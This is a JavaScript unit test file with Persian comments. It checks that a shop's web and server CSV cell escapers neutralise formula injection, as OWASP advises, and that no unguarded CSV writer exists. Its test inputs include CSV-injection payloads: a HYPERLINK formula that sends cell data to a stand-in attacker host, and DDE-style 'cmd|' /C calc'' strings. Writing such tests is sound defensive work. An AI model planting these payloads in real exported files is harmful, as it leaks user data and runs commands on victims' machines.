'use strict';
/**
 * R10 (بازبینیِ دومِ دستهٔ ۴۴) — خانهٔ CSV ِ نسخهٔ وبِ دکان (`license/csv-cell.js`) همان قاعدهٔ سرور (`finance-reports.cell`)، بی مرورگر.
 * (وبِ دکان به تصمیمِ صاحب برداشته شد، ۱۴۰۵/۰۸/۲۰: بارکننده، سرویس‌ورکر، index.html و report-ui.js رفتند؛ هسته همین‌جاست.)
 *
 *   ⛔ متنِ آغازشده با `=` `+` `-` `@` تب یا CR ⇒ «'» پیشش (OWASP)؛ عدد (typeof number) همان عدد، منفی هم؛ null/undefined ⇒ خالی.
 *   ⛔ جز متنِ فقط-عدد `^-?[0-9]+(\.[0-9]+)?$` (همان خانهٔ `g` ِ xlsx ِ `owner-export.js`): «-500.00» عدد می‌ماند؛ هر چیزِ دیگر نه.
 *   ⛔ مقدارِ هر خانه پس از خواندنِ CSV با سرور یکی است؛ تنها فرقِ متن: `;` ِ پیشینِ صفحه هم نقل‌قول می‌شود.
 *   ⛔ `install` همان `csvCell` ِ سراسریِ هر صفحه‌ای را که بخواند جایگزین می‌کند؛ نویسندهٔ CSV ِ دومِ بی همین قاعده در license/ نیست.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const ROOT = path.join(__dirname, '..', '..');
const read = (f) => fs.readFileSync(path.join(ROOT, f), 'utf8');
const W = require('../../license/csv-cell.js');
const { cell: server } = require('../src/lib/finance-reports');
const src = read('license/csv-cell.js');

/** یک خانهٔ CSV ⇐ مقدار (همان خواندنِ اکسل: نقل‌قول و «""») */
const unquote = (s) => (s.startsWith('"') ? s.slice(1, -1).replace(/""/g, '"') : s);

const INPUTS = [
  '=HYPERLINK("http://evil.example/?x="&A1,"کلیک")', '=1+1', '+SUM(1,2)', '-2+3', "@SUM(1+1)*cmd|' /C calc'!A0", '\t=1+1', '\r=1+1',
  '-500', '-', '+', '=', '@', "'=1", ' =1', 'چای سبز', 'a,b', 'a"b', 'a\nb', 'a\r\nb', 'a;b', '=a;b', '', '0', '1e5',
  '-500.00', '-0', '-0.5', '-1e5', '+500', '-.5', '- 500', '-500.', '--5', '-500\n', '-500 ', '-۵۰۰', '-150.00%', '-1,000', '=500', '@500',
  '\t500', '-5-5', '-5.5.5', '0.5', '500',
  -500, 500, 0, -0, 12.5, -0.25, NaN, true, false, null, undefined, 1234567890123,
];

test('هر خانه همان مقدارِ سرور است (فرمول ⇒ «\'»، عدد همان عدد)', () => {
  for (const v of INPUTS) assert.equal(unquote(W.cell(v)), unquote(server(v)), JSON.stringify(v));
  //  متنِ خروجی هم یکی است، جز `;` که صفحه از پیش نقل‌قول می‌کرد
  for (const v of INPUTS.filter((x) => !String(x).includes(';'))) assert.equal(W.cell(v), server(v), JSON.stringify(v));
});

test('فرمول بسته، عددِ منفی عدد، متنِ عادی دست‌نخورده', () => {
  assert.equal(W.cell('=HYPERLINK("http://evil.example/","x")'), '"\'=HYPERLINK(""http://evil.example/"",""x"")"');
  assert.equal(W.cell('+SUM(1,2)'), '"\'+SUM(1,2)"');
  assert.equal(W.cell('@cmd'), "'@cmd");
  assert.equal(W.cell('-2+3'), "'-2+3");
  assert.equal(W.cell('\t=1'), "'\t=1");
  assert.equal(W.cell('\r=1'), '"\'\r=1"');
  assert.equal(W.cell(-500), '-500', 'عددِ منفی (ستونِ مبلغ) عدد می‌ماند');
  assert.equal(W.cell('-500'), '-500', 'متنِ فقط-عدد فرمول نیست ⇒ عدد');
  assert.equal(W.cell('چای سبز'), 'چای سبز');
  assert.equal(W.cell('a;b'), '"a;b"', 'نقل‌قولِ `;` ِ پیشینِ صفحه می‌ماند');
  assert.equal(W.cell(null), '');
  assert.equal(W.cell(undefined), '');
  for (const v of INPUTS) {
    const ok = !/^[=+\-@\t\r]/.test(unquote(W.cell(v))) || typeof v === 'number' || /^-?[0-9]+(\.[0-9]+)?$/.test(v);
    assert.ok(ok, JSON.stringify(v));
  }
});

test('متنِ فقط-عدد (همان خانهٔ `g` ِ xlsx) عدد می‌ماند؛ هر شکلِ دیگرِ آغازشده با = + - @ تب CR «\'» می‌گیرد — سرور و وب', () => {
  //  همان یک الگو در سه جا (xlsx ِ وب، CSV ِ وب، CSV ِ سرور) — یکی بی دیگری عوض نشود
  const PATTERN = '/^-?[0-9]+(\\.[0-9]+)?$/';
  for (const f of ['license/owner-export.js', 'license/csv-cell.js', 'server/src/lib/finance-reports.js']) {
    assert.ok(read(f).includes(PATTERN), `${f}: ${PATTERN}`);
  }
  const plain = ['-500', '-500.00', '-0', '-0.5', '-1234567.89'];
  const prefixed = { '-2+3': "'-2+3", '-1e5': "'-1e5", '+500': "'+500", '-.5': "'-.5", '- 500': "'- 500", '-500.': "'-500.", '--5': "'--5",
    '-500 ': "'-500 ", '-۵۰۰': "'-۵۰۰", '-150.00%': "'-150.00%", '-1,000': '"\'-1,000"', '-500\n': '"\'-500\n"', '=500': "'=500",
    '@500': "'@500", '\t500': "'\t500", '-5-5': "'-5-5", '-5.5.5': "'-5.5.5", '-1+1+cmd|\' /C calc\'!A0': "'-1+1+cmd|' /C calc'!A0" };
  for (const fn of [W.cell, server]) {
    for (const v of plain) assert.equal(fn(v), v, `فقط-عدد: ${v}`);
    for (const [v, want] of Object.entries(prefixed)) assert.equal(fn(v), want, `فرمول‌نما: ${JSON.stringify(v)}`);
  }
});

test('نصب: `csvCell` ِ سراسری ⇐ `cell`؛ بی آن (Node، صفحهٔ دیگر) هیچ', () => {
  assert.equal(W.install(), false, 'در Node `csvCell` نیست');
  const vm = require('node:vm');
  const ctx = vm.createContext({ window: null });
  ctx.window = ctx;
  vm.runInContext('function csvCell(v){ return String(v); } function downloadCsv(rows){ return rows.map(r=> r.map(csvCell).join(",")).join("\\n"); }', ctx);
  vm.runInContext(src, ctx);
  assert.equal(typeof ctx.TohidCsvCell, 'object');
  assert.equal(ctx.downloadCsv([['=1+1', -5, 'نام']]), "'=1+1,-5,نام", '`downloadCsv` ِ صفحه همان `csvCell` ِ تازه را می‌خواند');
  assert.equal(ctx.TohidCsvCell.install(), true, 'دوباره ⇒ همان');
});

test('هیچ سازندهٔ CSV ِ دیگری در license/ نیست؛ بی innerHTML/eval', () => {
  for (const f of fs.readdirSync(path.join(ROOT, 'license')).filter((x) => x.endsWith('.js') && x !== 'csv-cell.js')) {
    assert.ok(!/type: ?'text\/csv/.test(read(`license/${f}`)), `license/${f}: CSV ِ دوم بی همین قاعده`);
  }
  for (const [bad, re] of [['eval', /\beval\s*\(/], ['new Function', /new\s+Function\s*\(/], ['innerHTML', /\.(?:inner|outer)HTML\s*=|insertAdjacentHTML/]]) {
    assert.ok(!re.test(src), bad);
  }
});

test('فهرستِ نویسنده‌های CSV: سرور فقط از `finance-reports.cell`، وب فقط از `csv-cell.js` — نویسندهٔ دومِ بی نگهبان نه', () => {
  const walk = (dir) => fs.readdirSync(path.join(ROOT, dir), { withFileTypes: true }).flatMap((d) => {
    const rel = `${dir}/${d.name}`;
    if (d.isDirectory()) return ['vendor', 'i18n', 'node_modules'].includes(d.name) ? [] : walk(rel);
    return /\.(js|mjs|html)$/.test(d.name) && !/\.min\.js$/.test(d.name) ? [rel] : [];
  });
  //  نشانِ نوشتنِ CSV: نوعِ text/csv، نامِ پروندهٔ ‎.csv‎ ِ دانلود، یا ردیفِ «,» که با CRLF پیوند می‌خورد
  const writes = (t) => /type: ?'text\/csv|'text\/csv;|\.csv["'`]|\.join\(','\)\)?\.join\('\\r\\n'\)|\.join\(','\)\);[^\n]*\n[^\n]*'\\r\\n'/.test(t);
  const found = ['server/src', 'license', 'server/public'].flatMap(walk).filter((f) => writes(read(f))).sort();
  const want = {
    'server/src/lib/finance-reports.js': /\.map\(cell\)\.join\(','\)/,
    'server/src/lib/image-bank.js': /require\('\.\/finance-reports'\)[\s\S]*\.map\(cell\)\.join\(','\)[\s\S]*\.map\(cell\)\.join\(','\)/,
    'server/src/routes/admin-image-bank.js': /bank\.reportCsv\(rep\)/,
    'server/public/admin/image-bank.js': /report\?format=csv/,
  };
  assert.deepEqual(found, Object.keys(want).sort(), 'نویسندهٔ CSV ِ تازه ⇒ همین قاعده و همین فهرست');
  for (const [f, re] of Object.entries(want)) assert.match(read(f), re, f);
  assert.ok(!/const esc = /.test(read('server/src/lib/image-bank.js').split('function reportCsv')[1].split('\n}\n')[0]), 'reportCsv بی `esc` ِ خودش');
});
